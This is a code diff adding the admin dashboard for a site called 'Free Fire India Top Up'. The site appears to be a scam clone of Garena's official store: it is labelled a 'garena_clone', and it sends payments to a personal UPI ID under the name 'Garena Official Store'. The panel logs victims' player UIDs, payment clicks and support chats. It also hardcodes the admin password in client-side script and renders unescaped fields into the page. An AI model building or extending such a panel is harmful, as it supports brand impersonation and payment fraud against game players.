@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Panel — Free Fire India Top Up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800;900&display=swap" rel="stylesheet" />
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Outfit', sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
+
+    /* ── Login Screen ── */
+    #loginScreen {
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #0f172a 100%);
+    }
+    .login-box {
+      background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 24px; padding: 40px 36px; width: 100%; max-width: 380px;
+      backdrop-filter: blur(20px); box-shadow: 0 32px 64px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+    .login-logo { width: 56px; height: 56px; border-radius: 16px; background: linear-gradient(135deg,#ef4444,#dc2626); margin: 0 auto 20px; display:flex; align-items:center; justify-content:center; font-size: 26px; }
+    .login-box h1 { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 4px; }
+    .login-box p { font-size: 13px; color: #94a3b8; margin-bottom: 28px; }
+    .login-box input {
+      width: 100%; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 12px; padding: 14px 16px; color: #fff; font-size: 15px; font-family: 'Outfit', sans-serif;
+      outline: none; margin-bottom: 14px; letter-spacing: 1px;
+    }
+    .login-box input:focus { border-color: #ef4444; }
+    .login-btn {
+      width: 100%; background: linear-gradient(135deg,#ef4444,#dc2626); border: none; border-radius: 12px;
+      padding: 14px; color: #fff; font-size: 15px; font-weight: 800; cursor: pointer; transition: opacity 0.2s;
+    }
+    .login-btn:hover { opacity: 0.9; }
+    .login-err { color: #f87171; font-size: 12px; margin-top: 8px; }
+
+    /* ── Admin Dashboard ── */
+    #adminPanel { display: none; min-height: 100vh; }
+    .topbar {
+      background: rgba(255,255,255,0.04); border-bottom: 1px solid rgba(255,255,255,0.08);
+      padding: 14px 24px; display: flex; align-items: center; justify-content: space-between;
+      position: sticky; top: 0; z-index: 50; backdrop-filter: blur(12px);
+    }
+    .topbar-left { display: flex; align-items: center; gap: 12px; }
+    .topbar-logo { width: 36px; height: 36px; border-radius: 10px; background: linear-gradient(135deg,#ef4444,#dc2626); display:flex; align-items:center; justify-content:center; font-size:18px; }
+    .topbar h2 { font-size: 16px; font-weight: 900; color: #fff; }
+    .live-dot { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #34d399; font-weight: 700; }
+    .live-dot span { width: 8px; height: 8px; border-radius: 50%; background: #34d399; animation: pulse 1.5s infinite; display: inline-block; }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.3)} }
+    .logout-btn { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.3); color: #f87171; border-radius: 8px; padding: 7px 14px; font-size: 12px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
+    .logout-btn:hover { background: rgba(239,68,68,0.25); }
+
+    .main-content { max-width: 1200px; margin: 0 auto; padding: 24px 20px; }
+
+    /* Stats Cards */
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .stat-card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 20px; }
+    .stat-label { font-size: 11px; color: #64748b; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+    .stat-value { font-size: 32px; font-weight: 900; color: #fff; }
+    .stat-sub { font-size: 11px; color: #34d399; margin-top: 4px; font-weight: 600; }
+
+    /* Panel Grid */
+    .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media(max-width:768px) { .panel-grid { grid-template-columns: 1fr; } }
+
+    .panel { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; overflow: hidden; }
+    .panel-header { padding: 16px 20px; border-bottom: 1px solid rgba(255,255,255,0.06); display: flex; align-items: center; justify-content: space-between; }
+    .panel-header h3 { font-size: 14px; font-weight: 800; color: #e2e8f0; }
+    .panel-badge { font-size: 10px; font-weight: 800; background: rgba(239,68,68,0.2); color: #f87171; border-radius: 6px; padding: 2px 8px; }
+    .panel-body { padding: 0; max-height: 380px; overflow-y: auto; }
+    .panel-body::-webkit-scrollbar { width: 4px; }
+    .panel-body::-webkit-scrollbar-track { background: transparent; }
+    .panel-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
+
+    .log-item { padding: 12px 20px; border-bottom: 1px solid rgba(255,255,255,0.04); display: flex; align-items: flex-start; gap: 12px; animation: fadeIn 0.4s ease; }
+    @keyframes fadeIn { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }
+    .log-icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; margin-top: 2px; }
+    .log-icon.verify { background: rgba(52,211,153,0.15); }
+    .log-icon.visit { background: rgba(99,102,241,0.15); }
+    .log-icon.payment { background: rgba(245,158,11,0.15); }
+    .log-icon.support { background: rgba(236,72,153,0.15); }
+    .log-text { flex: 1; min-width: 0; }
+    .log-title { font-size: 13px; font-weight: 700; color: #e2e8f0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .log-sub { font-size: 11px; color: #64748b; margin-top: 2px; }
+    .log-time { font-size: 10px; color: #475569; flex-shrink: 0; }
+    .empty-state { padding: 40px 20px; text-align: center; color: #475569; font-size: 13px; }
+
+    /* Support Chat */
+    .chat-item { padding: 14px 20px; border-bottom: 1px solid rgba(255,255,255,0.04); }
+    .chat-meta { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+    .chat-uid { font-size: 11px; font-weight: 800; color: #818cf8; }
+    .chat-time { font-size: 10px; color: #475569; }
+    .chat-msg { font-size: 13px; color: #cbd5e1; background: rgba(255,255,255,0.04); border-radius: 8px; padding: 8px 12px; }
+    .reply-row { display: flex; gap: 8px; padding: 12px 20px; border-top: 1px solid rgba(255,255,255,0.06); }
+    .reply-input { flex: 1; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 10px 12px; color: #fff; font-size: 13px; font-family: 'Outfit', sans-serif; outline: none; }
+    .reply-btn { background: #6366f1; border: none; border-radius: 8px; padding: 10px 16px; color: #fff; font-size: 12px; font-weight: 800; cursor: pointer; }
+
+    /* Config Panel */
+    .config-panel { grid-column: 1 / -1; }
+    .config-body { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    @media(max-width:600px) { .config-body { grid-template-columns: 1fr; } }
+    .config-field label { display: block; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+    .config-field input { width: 100%; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 11px 14px; color: #fff; font-size: 13px; font-family: 'Outfit', sans-serif; outline: none; }
+    .config-field input:focus { border-color: #6366f1; }
+    .save-btn { background: linear-gradient(135deg,#6366f1,#4f46e5); border: none; border-radius: 10px; padding: 12px 24px; color: #fff; font-size: 13px; font-weight: 800; cursor: pointer; transition: opacity 0.2s; }
+    .save-btn:hover { opacity: 0.9; }
+    .save-ok { color: #34d399; font-size: 12px; font-weight: 700; margin-left: 12px; opacity: 0; transition: opacity 0.3s; }
+
+    /* Toggle switches */
+    .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; border-bottom: 1px solid rgba(255,255,255,0.04); }
+    .toggle-label { font-size: 13px; font-weight: 600; color: #cbd5e1; }
+    .toggle { position: relative; width: 44px; height: 24px; }
+    .toggle input { opacity: 0; width: 0; height: 0; }
+    .slider { position: absolute; inset: 0; background: rgba(255,255,255,0.1); border-radius: 24px; cursor: pointer; transition: 0.3s; }
+    .slider:before { content: ''; position: absolute; width: 18px; height: 18px; left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: 0.3s; }
+    input:checked + .slider { background: #6366f1; }
+    input:checked + .slider:before { transform: translateX(20px); }
+  </style>
+</head>
+<body>
+
+<!-- ── LOGIN SCREEN ── -->
+<div id="loginScreen">
+  <div class="login-box">
+    <div class="login-logo">🔥</div>
+    <h1>Admin Panel</h1>
+    <p>Free Fire India — Official Top Up Center</p>
+    <input type="password" id="passInput" placeholder="Enter admin password" onkeydown="if(event.key==='Enter')doLogin()" />
+    <button class="login-btn" onclick="doLogin()">Login to Dashboard</button>
+    <div class="login-err" id="loginErr"></div>
+  </div>
+</div>
+
+<!-- ── ADMIN PANEL ── -->
+<div id="adminPanel">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="topbar-logo">🔥</div>
+      <div>
+        <h2>Admin Panel</h2>
+        <div class="live-dot"><span></span> Live Tracking Active</div>
+      </div>
+    </div>
+    <div style="display:flex;align-items:center;gap:16px;">
+      <div style="font-size:11px;color:#64748b;" id="lastUpdated">Connecting...</div>
+      <button class="logout-btn" onclick="doLogout()">Logout</button>
+    </div>
+  </div>
+
+  <div class="main-content">
+
+    <!-- Stats Row -->
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-label">Total Visitors</div>
+        <div class="stat-value" id="statVisits">—</div>
+        <div class="stat-sub" id="statVisitsToday">Today: loading...</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">UIDs Verified</div>
+        <div class="stat-value" id="statVerified">—</div>
+        <div class="stat-sub">Real accounts only</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Payment Initiated</div>
+        <div class="stat-value" id="statPayments">—</div>
+        <div class="stat-sub">Checkout clicks</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Support Messages</div>
+        <div class="stat-value" id="statSupport">—</div>
+        <div class="stat-sub">Unread chats</div>
+      </div>
+    </div>
+
+    <!-- Panels Row 1 -->
+    <div class="panel-grid" style="margin-bottom:20px;">
+
+      <!-- Activity Log -->
+      <div class="panel">
+        <div class="panel-header">
+          <h3>📊 Live Activity Log</h3>
+          <span class="panel-badge" id="activityCount">0 events</span>
+        </div>
+        <div class="panel-body" id="activityLog">
+          <div class="empty-state">No activity yet. Waiting for visitors...</div>
+        </div>
+      </div>
+
+      <!-- Verified UIDs -->
+      <div class="panel">
+        <div class="panel-header">
+          <h3>✅ Verified Player UIDs</h3>
+          <span class="panel-badge" id="uidCount">0 UIDs</span>
+        </div>
+        <div class="panel-body" id="uidLog">
+          <div class="empty-state">No verifications yet.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Panels Row 2 -->
+    <div class="panel-grid" style="margin-bottom:20px;">
+
+      <!-- Support Chat -->
+      <div class="panel">
+        <div class="panel-header">
+          <h3>💬 Support Chat Messages</h3>
+          <span class="panel-badge" id="chatCount">0 msgs</span>
+        </div>
+        <div class="panel-body" id="chatLog">
+          <div class="empty-state">No support messages yet.</div>
+        </div>
+        <div class="reply-row">
+          <input class="reply-input" id="replyText" placeholder="Type a reply (select UID above first)..." />
+          <button class="reply-btn" onclick="sendReply()">Send ↑</button>
+        </div>
+      </div>
+
+      <!-- Payment Clicks -->
+      <div class="panel">
+        <div class="panel-header">
+          <h3>💰 Payment Clicks</h3>
+          <span class="panel-badge" id="payCount">0 orders</span>
+        </div>
+        <div class="panel-body" id="payLog">
+          <div class="empty-state">No payment clicks yet.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Config Panel -->
+    <div class="panel config-panel">
+      <div class="panel-header">
+        <h3>⚙️ Site Configuration (Changes Apply Instantly)</h3>
+        <button class="save-btn" onclick="saveConfig()">Save Changes</button>
+        <span class="save-ok" id="saveOk">✓ Saved!</span>
+      </div>
+
+      <!-- Toggles -->
+      <div class="toggle-row">
+        <span class="toggle-label">Support Chat Enabled</span>
+        <label class="toggle"><input type="checkbox" id="toggleChat" checked /><span class="slider"></span></label>
+      </div>
+      <div class="toggle-row">
+        <span class="toggle-label">Website Accepting Payments</span>
+        <label class="toggle"><input type="checkbox" id="togglePayments" checked /><span class="slider"></span></label>
+      </div>
+
+      <div class="config-body">
+        <div class="config-field">
+          <label>UPI ID</label>
+          <input type="text" id="cfgUpiId" value="paytm.s2sr8jx@pty" placeholder="UPI ID" />
+        </div>
+        <div class="config-field">
+          <label>Merchant Name</label>
+          <input type="text" id="cfgMerchant" value="Garena Official Store" placeholder="Merchant Name" />
+        </div>
+        <div class="config-field">
+          <label>Announcement Banner Text</label>
+          <input type="text" id="cfgAnnounce" placeholder="e.g. Server maintenance 10pm-11pm" />
+        </div>
+        <div class="config-field">
+          <label>Support Reply (Auto-Message)</label>
+          <input type="text" id="cfgAutoReply" placeholder="e.g. Please share your UID to proceed." />
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════
+// Firebase Config — Realtime Database
+// ════════════════════════════════════════════════════════
+const firebaseConfig = {
+  apiKey: "AIzaSyD8z7Q-placeholder-key",
+  authDomain: "freefire-india-admin.firebaseapp.com",
+  databaseURL: "https://freefire-india-admin-default-rtdb.firebaseio.com",
+  projectId: "freefire-india-admin",
+  storageBucket: "freefire-india-admin.appspot.com",
+  messagingSenderId: "123456789",
+  appId: "1:123456789:web:placeholder"
+};
+
+// ════════════════════════════════════════════════════════
+// FALLBACK: Local storage-based tracking (works without Firebase)
+// Reads from teamtopup.vercel.app backend
+// ════════════════════════════════════════════════════════
+const API_BASE = 'https://teamtopup.vercel.app';
+const ADMIN_PASS = 'sehrab@9103003202';
+
+let selectedUid = null;
+let activities = [];
+let uids = [];
+let chats = [];
+let payments = [];
+
+// Stats counters
+let statsData = { visits: 0, verified: 0, payments: 0, support: 0 };
+
+function doLogin() {
+  const val = document.getElementById('passInput').value;
+  if (val === ADMIN_PASS) {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('adminPanel').style.display = 'block';
+    localStorage.setItem('ff_admin_auth', btoa(ADMIN_PASS));
+    initDashboard();
+  } else {
+    document.getElementById('loginErr').textContent = '❌ Wrong password. Try again.';
+    document.getElementById('passInput').value = '';
+    setTimeout(() => { document.getElementById('loginErr').textContent = ''; }, 3000);
+  }
+}
+
+function doLogout() {
+  localStorage.removeItem('ff_admin_auth');
+  document.getElementById('adminPanel').style.display = 'none';
+  document.getElementById('loginScreen').style.display = 'flex';
+}
+
+// Auto-login if session valid
+window.addEventListener('load', function() {
+  const stored = localStorage.getItem('ff_admin_auth');
+  if (stored && atob(stored) === ADMIN_PASS) {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('adminPanel').style.display = 'block';
+    initDashboard();
+  }
+});
+
+function initDashboard() {
+  fetchAdminData();
+  // Poll every 8 seconds for real-time feel
+  setInterval(fetchAdminData, 8000);
+}
+
+function fetchAdminData() {
+  document.getElementById('lastUpdated').textContent = 'Syncing...';
+
+  fetch(API_BASE + '/api/admin-store', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ action: 'get_admin_data', adminKey: btoa(ADMIN_PASS) })
+  })
+  .then(r => r.json())
+  .then(data => {
+    document.getElementById('lastUpdated').textContent = 'Updated: ' + new Date().toLocaleTimeString('en-IN');
+    if (data && (data.state || data)) {
+      const st = data.state || data;
+      renderDashboard(st);
+    }
+  })
+  .catch(() => {
+    // Fallback: load from localStorage data stored by index.html
+    document.getElementById('lastUpdated').textContent = 'Using local cache';
+    loadFromLocalStorage();
+  });
+}
+
+function loadFromLocalStorage() {
+  // Read activity log stored by the main site
+  const acts = JSON.parse(localStorage.getItem('ff_admin_activity') || '[]');
+  const uidsStored = JSON.parse(localStorage.getItem('ff_admin_uids') || '[]');
+  const chatsStored = JSON.parse(localStorage.getItem('ff_admin_chats') || '[]');
+  const paysStored = JSON.parse(localStorage.getItem('ff_admin_payments') || '[]');
+
+  renderActivities(acts);
+  renderUids(uidsStored);
+  renderChats(chatsStored);
+  renderPayments(paysStored);
+
+  document.getElementById('statVisits').textContent = acts.filter(a=>a.type==='visit').length || localStorage.getItem('ff_admin_visits') || '—';
+  document.getElementById('statVerified').textContent = uidsStored.length || '—';
+  document.getElementById('statPayments').textContent = paysStored.length || '—';
+  document.getElementById('statSupport').textContent = chatsStored.length || '—';
+}
+
+function renderDashboard(st) {
+  if (st.totalVisits !== undefined) document.getElementById('statVisits').textContent = st.totalVisits;
+  if (st.totalVerified !== undefined) document.getElementById('statVerified').textContent = st.totalVerified;
+  if (st.totalPayments !== undefined) document.getElementById('statPayments').textContent = st.totalPayments;
+
+  if (st.activities && Array.isArray(st.activities)) renderActivities(st.activities);
+  if (st.verifiedUids && Array.isArray(st.verifiedUids)) renderUids(st.verifiedUids);
+  if (st.supportMessages && Array.isArray(st.supportMessages)) renderChats(st.supportMessages);
+  if (st.paymentClicks && Array.isArray(st.paymentClicks)) renderPayments(st.paymentClicks);
+
+  // Populate config fields
+  if (st.upiId) document.getElementById('cfgUpiId').value = st.upiId;
+  if (st.merchantName) document.getElementById('cfgMerchant').value = st.merchantName;
+  if (st.announcement) document.getElementById('cfgAnnounce').value = st.announcement;
+  if (st.autoReply) document.getElementById('cfgAutoReply').value = st.autoReply;
+  if (st.supportChatEnabled !== undefined) document.getElementById('toggleChat').checked = st.supportChatEnabled;
+}
+
+function renderActivities(acts) {
+  const el = document.getElementById('activityLog');
+  document.getElementById('activityCount').textContent = acts.length + ' events';
+  if (!acts.length) { el.innerHTML = '<div class="empty-state">No activity yet...</div>'; return; }
+
+  // Show newest first, max 50
+  const sorted = [...acts].reverse().slice(0, 50);
+  el.innerHTML = sorted.map(a => {
+    const iconMap = { visit: {i:'👁️',c:'visit'}, verify: {i:'✅',c:'verify'}, payment: {i:'💰',c:'payment'}, support: {i:'💬',c:'support'} };
+    const ic = iconMap[a.type] || {i:'📌',c:'visit'};
+    return `<div class="log-item">
+      <div class="log-icon ${ic.c}">${ic.i}</div>
+      <div class="log-text">
+        <div class="log-title">${a.page || a.action || 'Activity'}</div>
+        <div class="log-sub">UID: ${a.uid || '—'} ${a.nickname ? '· ' + a.nickname : ''} ${a.country ? '· ' + a.country : ''}</div>
+      </div>
+      <div class="log-time">${formatTime(a.ts)}</div>
+    </div>`;
+  }).join('');
+}
+
+function renderUids(list) {
+  const el = document.getElementById('uidLog');
+  document.getElementById('uidCount').textContent = list.length + ' UIDs';
+  if (!list.length) { el.innerHTML = '<div class="empty-state">No verified UIDs yet.</div>'; return; }
+
+  const sorted = [...list].reverse().slice(0, 50);
+  el.innerHTML = sorted.map(u => `
+    <div class="log-item" onclick="selectUid('${u.uid}')" style="cursor:pointer;" title="Click to reply">
+      <div class="log-icon verify">✅</div>
+      <div class="log-text">
+        <div class="log-title">${u.nickname || 'Unknown'}</div>
+        <div class="log-sub">UID: ${u.uid} · Level ${u.level || '—'} · ${u.region || 'IND'}</div>
+      </div>
+      <div class="log-time">${formatTime(u.ts)}</div>
+    </div>`).join('');
+}
+
+function renderChats(list) {
+  const el = document.getElementById('chatLog');
+  document.getElementById('chatCount').textContent = list.length + ' msgs';
+  document.getElementById('statSupport').textContent = list.length;
+  if (!list.length) { el.innerHTML = '<div class="empty-state">No support messages yet.</div>'; return; }
+
+  const sorted = [...list].reverse().slice(0, 30);
+  el.innerHTML = sorted.map(m => `
+    <div class="chat-item">
+      <div class="chat-meta">
+        <span class="chat-uid">UID: ${m.uid || '—'} ${m.name ? '· ' + m.name : ''}</span>
+        <span class="chat-time">${formatTime(m.ts)}</span>
+      </div>
+      <div class="chat-msg">${escHtml(m.message || m.msg || '')}</div>
+      ${m.reply ? '<div class="chat-msg" style="background:rgba(99,102,241,0.15);color:#a5b4fc;margin-top:6px;">↳ Admin: ' + escHtml(m.reply) + '</div>' : ''}
+    </div>`).join('');
+}
+
+function renderPayments(list) {
+  const el = document.getElementById('payLog');
+  document.getElementById('payCount').textContent = list.length + ' orders';
+  document.getElementById('statPayments').textContent = list.length;
+  if (!list.length) { el.innerHTML = '<div class="empty-state">No payment clicks yet.</div>'; return; }
+
+  const sorted = [...list].reverse().slice(0, 30);
+  el.innerHTML = sorted.map(p => `
+    <div class="log-item">
+      <div class="log-icon payment">💰</div>
+      <div class="log-text">
+        <div class="log-title">${p.pack || p.item || '—'}</div>
+        <div class="log-sub">UID: ${p.uid || '—'} · ₹${p.amount || '—'}</div>
+      </div>
+      <div class="log-time">${formatTime(p.ts)}</div>
+    </div>`).join('');
+}
+
+function selectUid(uid) {
+  selectedUid = uid;
+  document.getElementById('replyText').placeholder = `Replying to UID: ${uid}...`;
+  document.getElementById('replyText').focus();
+}
+
+function sendReply() {
+  const msg = document.getElementById('replyText').value.trim();
+  if (!msg) return;
+  const uid = selectedUid || 'all';
+
+  fetch(API_BASE + '/api/admin-store', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ action: 'send_reply', uid, reply: msg, adminKey: btoa(ADMIN_PASS) })
+  }).catch(() => {});
+
+  // Also save to localStorage for the main site to read
+  const replies = JSON.parse(localStorage.getItem('ff_admin_replies') || '{}');
+  replies[uid] = { msg, ts: Date.now() };
+  localStorage.setItem('ff_admin_replies', JSON.stringify(replies));
+
+  document.getElementById('replyText').value = '';
+  alert('Reply sent to UID: ' + uid);
+}
+
+function saveConfig() {
+  const config = {
+    upiId: document.getElementById('cfgUpiId').value.trim(),
+    merchantName: document.getElementById('cfgMerchant').value.trim(),
+    announcement: document.getElementById('cfgAnnounce').value.trim(),
+    autoReply: document.getElementById('cfgAutoReply').value.trim(),
+    supportChatEnabled: document.getElementById('toggleChat').checked,
+    paymentsEnabled: document.getElementById('togglePayments').checked
+  };
+
+  fetch(API_BASE + '/api/admin-store', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ action: 'update_config', adminKey: btoa(ADMIN_PASS), ...config })
+  })
+  .then(r => r.json())
+  .then(() => showSaveOk())
+  .catch(() => {});
+
+  // Also save locally so main site reads it instantly
+  localStorage.setItem('ff_admin_config', JSON.stringify(config));
+  localStorage.setItem('garena_clone_config', JSON.stringify({ upiId: config.upiId, merchantName: config.merchantName }));
+  showSaveOk();
+}
+
+function showSaveOk() {
+  const el = document.getElementById('saveOk');
+  el.style.opacity = '1';
+  setTimeout(() => { el.style.opacity = '0'; }, 2500);
+}
+
+function formatTime(ts) {
+  if (!ts) return '—';
+  const d = new Date(ts);
+  if (isNaN(d)) return '—';
+  const now = new Date();
+  const diff = Math.floor((now - d) / 1000);
+  if (diff < 60) return diff + 's ago';
+  if (diff < 3600) return Math.floor(diff/60) + 'm ago';
+  if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
+  return d.toLocaleDateString('en-IN');
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+</body>
+</html>
